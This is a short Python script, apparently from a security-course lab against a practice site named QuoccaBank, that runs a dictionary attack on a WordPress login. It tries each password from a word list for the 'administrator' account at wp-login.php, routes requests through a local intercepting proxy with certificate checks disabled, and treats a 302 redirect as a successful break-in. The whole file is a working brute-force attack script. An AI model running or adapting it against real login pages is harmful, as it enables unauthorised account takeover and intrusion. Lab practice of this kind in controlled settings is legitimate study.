import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

fp = open('words.txt')
words = fp.readlines()
for word in words:
    word = word.strip()
    data = {}
    data["log"] = "administrator"
    data["pwd"] = word
    print(f"Trying password: {word}")
    # allow_redirects set to False so that it won't redirect to the next page and return the wrong status code
    r = requests.post(f"https://blog.quoccabank.com/wp-login.php", allow_redirects=False, proxies=proxies, verify=False, data=data)
    print(r.status_code)
    # Will only redirect (status code = 302) when success
    if r.status_code == 302:
        print(f"SUCCESS password: {word}")
        break
    else:
        continue